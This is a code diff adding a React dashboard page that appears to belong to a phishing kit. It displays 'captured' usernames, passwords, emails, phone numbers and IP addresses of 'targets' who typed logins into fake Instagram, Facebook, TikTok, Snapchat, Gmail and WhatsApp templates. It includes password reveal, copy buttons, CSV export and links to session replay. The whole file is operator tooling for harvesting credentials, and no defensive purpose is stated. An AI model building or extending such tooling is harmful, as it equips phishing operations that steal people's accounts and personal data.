@@ -1,0 +1,298 @@
+import { useEffect, useState, useCallback } from 'react'
+import { api, Session } from '../api/client'
+import { exportCSV } from '../utils/export'
+
+interface Credential {
+  id: string
+  session_id: string
+  template_id: string | null
+  username: string | null
+  password: string | null
+  email: string | null
+  phone: string | null
+  ip_address: string | null
+  created_at: number
+}
+
+function relativeTime(ts: number): string {
+  const seconds = Math.floor(Date.now() / 1000 - ts)
+  if (seconds < 60) return `${seconds}s ago`
+  const minutes = Math.floor(seconds / 60)
+  if (minutes < 60) return `${minutes}m ago`
+  const hours = Math.floor(minutes / 60)
+  if (hours < 24) return `${hours}h ago`
+  const days = Math.floor(hours / 24)
+  return `${days}d ago`
+}
+
+function passwordStrength(pw: string | null): { label: string; color: string; score: number } | null {
+  if (!pw || pw.length < 2) return null
+  let score = 0
+  if (pw.length >= 8) score++
+  if (pw.length >= 12) score++
+  if (/[A-Z]/.test(pw)) score++
+  if (/[a-z]/.test(pw)) score++
+  if (/[0-9]/.test(pw)) score++
+  if (/[^A-Za-z0-9]/.test(pw)) score++
+  if (score <= 1) return { label: 'Weak', color: '#ff453a', score }
+  if (score <= 3) return { label: 'Fair', color: '#ff9f0a', score }
+  if (score <= 5) return { label: 'Good', color: '#30d158', score }
+  return { label: 'Strong', color: '#30d158', score }
+}
+
+const TEMPLATE_ICONS: Record<string, string> = {
+  instagram: '📷', facebook: '📘', tiktok: '🎵', snapchat: '👻',
+  gmail: '✉', whatsapp: '💬'
+}
+
+const CODE_PARAM = new URLSearchParams(window.location.search).get('code') || ''
+
+export default function Credentials() {
+  const [creds, setCreds] = useState<Credential[]>([])
+  const [loading, setLoading] = useState(true)
+  const [error, setError] = useState<string | null>(null)
+  const [revealed, setRevealed] = useState<Set<string>>(new Set())
+  const [search, setSearch] = useState('')
+  const [sessions, setSessions] = useState<Session[]>([])
+  const [sessionFilter, setSessionFilter] = useState('')
+  const [offset, setOffset] = useState(0)
+  const [hasMore, setHasMore] = useState(true)
+  const [loadingMore, setLoadingMore] = useState(false)
+  const [paused, setPaused] = useState(false)
+  const LIMIT = 50
+
+  const fetchData = useCallback(async (append = false) => {
+    try {
+      setError(null)
+      const params = new URLSearchParams()
+      if (sessionFilter) params.set('session', sessionFilter)
+      params.set('offset', String(append ? offset : 0))
+      params.set('limit', String(LIMIT))
+      const r = await fetch('/api/credentials?' + params.toString())
+      if (!r.ok) throw new Error(`HTTP ${r.status}`)
+      const data: Credential[] = await r.json()
+      if (append) {
+        setCreds(prev => [...prev, ...data])
+      } else {
+        setCreds(data)
+        setOffset(0)
+      }
+      setHasMore(data.length >= LIMIT)
+    } catch (e) {
+      setError(e instanceof Error ? e.message : 'Failed to load')
+    } finally {
+      setLoading(false)
+      setLoadingMore(false)
+    }
+  }, [sessionFilter, offset])
+
+  useEffect(() => {
+    api.sessions().then(setSessions).catch(() => {})
+  }, [])
+
+  useEffect(() => {
+    setOffset(0)
+    setCreds([])
+    setLoading(true)
+    fetchData(false)
+  }, [sessionFilter, fetchData])
+
+  useEffect(() => {
+    if (paused) return
+    const t = setInterval(() => fetchData(false), 15000)
+    return () => clearInterval(t)
+  }, [paused, sessionFilter, fetchData])
+
+  const loadMore = () => {
+    setLoadingMore(true)
+    setOffset(prev => prev + LIMIT)
+    fetchData(true)
+  }
+
+  const toggleReveal = (id: string) => {
+    setRevealed(prev => {
+      const next = new Set(prev)
+      if (next.has(id)) next.delete(id); else next.add(id)
+      return next
+    })
+  }
+
+  const copy = (text: string) => navigator.clipboard.writeText(text)
+
+  const handleDelete = async (id: string) => {
+    try {
+      setError(null)
+      await api.deleteCredential(id)
+      setCreds(prev => prev.filter(c => c.id !== id))
+    } catch (e) {
+      setError('Failed to delete')
+    }
+  }
+
+  const handleDeleteAll = async () => {
+    try {
+      setError(null)
+      await api.deleteAllCredentials()
+      setCreds([])
+    } catch (e) {
+      setError('Failed to delete all')
+    }
+  }
+
+  const filtered = creds.filter(c => {
+    if (!search) return true
+    const q = search.toLowerCase()
+    return [c.username, c.email, c.phone, c.ip_address, c.template_id, c.session_id, c.password]
+      .some(f => f?.toLowerCase().includes(q))
+  })
+
+  if (loading) return <div className="flex justify-center py-20"><div className="spinner"></div></div>
+
+  return (
+    <div className="space-y-4 stagger">
+      {error && (
+        <div className="content-card border-0 !border-l-2" style={{ borderLeftColor: 'var(--accent)', backgroundColor: 'color-mix(in srgb, var(--accent) 8%, transparent)' }}>
+          <div className="flex items-center justify-between">
+            <span className="text-sm" style={{ color: 'var(--accent)' }}>⚠ {error}</span>
+            <button onClick={() => setError(null)} className="text-xs text-tertiary hover:text-primary">✕</button>
+          </div>
+        </div>
+      )}
+
+      <div className="flex items-center justify-between flex-wrap gap-3 animate-fade-in">
+        <div>
+          <h1 className="text-xl font-bold text-primary">Credentials</h1>
+          <p className="text-sm text-tertiary mt-0.5">{filtered.length} of {creds.length} login credentials captured</p>
+        </div>
+        <div className="flex items-center gap-2">
+          <button onClick={() => setPaused(p => !p)} className="select-apple cursor-pointer text-sm">
+            {paused ? '▶ Resume' : '⏸ Pause'}
+          </button>
+          {creds.length > 0 && (
+            <>
+              <button onClick={() => exportCSV(filtered.map(c => ({
+                username: c.username, password: c.password, email: c.email, phone: c.phone,
+                template: c.template_id, ip: c.ip_address, session: c.session_id,
+                date: new Date(c.created_at * 1000).toISOString()
+              })), 'credentials.csv')} className="select-apple cursor-pointer">📥 CSV</button>
+              <button onClick={handleDeleteAll} className="select-apple cursor-pointer"
+                style={{ color: 'var(--accent)' }}>🗑 Delete All</button>
+            </>
+          )}
+          <button onClick={() => { setCreds([]); setLoading(true); fetchData(false) }} className="select-apple cursor-pointer">⟳</button>
+        </div>
+      </div>
+
+      <div className="flex gap-2">
+        <input type="text" placeholder="Search username, email, phone, IP, password, session..."
+          value={search} onChange={e => setSearch(e.target.value)} className="input-apple" />
+        <select value={sessionFilter} onChange={e => setSessionFilter(e.target.value)} className="select-apple">
+          <option value="">All Sessions</option>
+          {sessions.map(s => (
+            <option key={s.id} value={s.id}>{s.name || s.id.substring(0, 16)}</option>
+          ))}
+        </select>
+      </div>
+
+      {filtered.length === 0 ? (
+        <div className="empty-state animate-fade-in">
+          <div className="icon">🔑</div>
+          <h3>{search ? 'No matches' : 'No credentials captured yet'}</h3>
+          <p>{search ? 'Try a different search' : 'Credentials appear when targets enter login info on social media templates'}</p>
+        </div>
+      ) : (
+        <div className="space-y-3">
+          {filtered.map((c, i) => {
+            const strength = passwordStrength(c.password)
+            return (
+              <div key={c.id} className="content-card stagger animate-fade-in"
+                style={{ animationDelay: `${Math.min(i * 0.02, 0.5)}s` }}>
+                <div className="flex items-start justify-between">
+                  <div className="flex items-center gap-3 min-w-0">
+                    <span className="text-2xl select-none shrink-0">{TEMPLATE_ICONS[c.template_id ?? ''] || '🔒'}</span>
+                    <div className="min-w-0">
+                      <div className="text-sm font-semibold text-primary truncate">{c.username || 'unknown'}</div>
+                      <div className="text-xs text-tertiary flex items-center gap-2 flex-wrap">
+                        <span className="mono">{c.template_id}</span>
+                        <span>·</span>
+                        <a href={`/?code=${CODE_PARAM}#/replay`} className="mono accent hover:underline"
+                          title={c.session_id}>{c.session_id.substring(0, 16)}</a>
+                      </div>
+                    </div>
+                  </div>
+                  <div className="flex items-center gap-2 shrink-0">
+                    {strength && (
+                      <span className="text-[10px] px-1.5 py-0.5 rounded font-medium"
+                        style={{ backgroundColor: strength.color + '20', color: strength.color }}>
+                        {strength.label}
+                      </span>
+                    )}
+                    <button onClick={() => handleDelete(c.id)} className="text-xs text-tertiary hover:text-red-400">🗑</button>
+                    <span className="text-xs text-tertiary whitespace-nowrap" title={new Date(c.created_at * 1000).toLocaleString()}>
+                      {relativeTime(c.created_at)}
+                    </span>
+                  </div>
+                </div>
+                <div className="mt-3 grid grid-cols-2 gap-3">
+                  <div className="bg-primary radius-card p-2.5">
+                    <div className="text-[10px] text-tertiary uppercase tracking-wider">Password</div>
+                    <div className="flex items-center gap-2 mt-1">
+                      <code className="text-xs text-secondary flex-1 truncate">
+                        {revealed.has(c.id) ? c.password : '••••••••••••'}
+                      </code>
+                      <button onClick={() => toggleReveal(c.id)}
+                        className="text-xs text-tertiary hover:text-secondary">
+                        {revealed.has(c.id) ? '🙈' : '👁'}
+                      </button>
+                      <button onClick={() => copy(c.password ?? '')}
+                        className="text-xs text-tertiary hover:text-secondary">📋</button>
+                    </div>
+                  </div>
+                  <div className="bg-primary radius-card p-2.5">
+                    <div className="text-[10px] text-tertiary uppercase tracking-wider">IP Address</div>
+                    <a href={`/?code=${CODE_PARAM}#/ips`}
+                      className="text-xs accent mono mt-1 block break-all hover:underline"
+                      title="View IP logs">{c.ip_address || 'unknown'}</a>
+                  </div>
+                  <div className="bg-primary radius-card p-2.5">
+                    <div className="text-[10px] text-tertiary uppercase tracking-wider">Email</div>
+                    <code className="text-xs mono mt-1 block break-all" style={{ color: '#34c759' }}>{c.email || '—'}</code>
+                    {c.email && (
+                      <button onClick={() => copy(c.email!)}
+                        className="text-[10px] text-tertiary hover:text-secondary mt-1">📋 Copy</button>
+                    )}
+                  </div>
+                  <div className="bg-primary radius-card p-2.5">
+                    <div className="text-[10px] text-tertiary uppercase tracking-wider">Phone</div>
+                    <code className="text-xs mono mt-1 block break-all" style={{ color: '#ff9f0a' }}>{c.phone || '—'}</code>
+                    {c.phone && (
+                      <button onClick={() => copy(c.phone!)}
+                        className="text-[10px] text-tertiary hover:text-secondary mt-1">📋 Copy</button>
+                    )}
+                  </div>
+                </div>
+                <div className="mt-3 flex gap-2">
+                  <button onClick={() => copy(c.username ?? '')}
+                    className="text-xs px-3 py-1.5 bg-tertiary text-secondary rounded-lg hover:text-primary transition-colors">📋 Copy Username</button>
+                  <button onClick={() => copy(c.password ?? '')}
+                    className="text-xs px-3 py-1.5 bg-tertiary text-secondary rounded-lg hover:text-primary transition-colors">📋 Copy Password</button>
+                </div>
+              </div>
+            )
+          })}
+          {hasMore && (
+            <div className="flex justify-center py-4">
+              <button onClick={loadMore} disabled={loadingMore}
+                className="px-6 py-2 rounded-lg text-sm transition-colors"
+                style={{ backgroundColor: 'var(--bg-tertiary)', color: 'var(--secondary)' }}
+                onMouseEnter={e => (e.target as HTMLElement).style.opacity = '0.7'}
+                onMouseLeave={e => (e.target as HTMLElement).style.opacity = '1'}>
+                {loadingMore ? 'Loading...' : 'Load More'}
+              </button>
+            </div>
+          )}
+        </div>
+      )}
+    </div>
+  )
+}
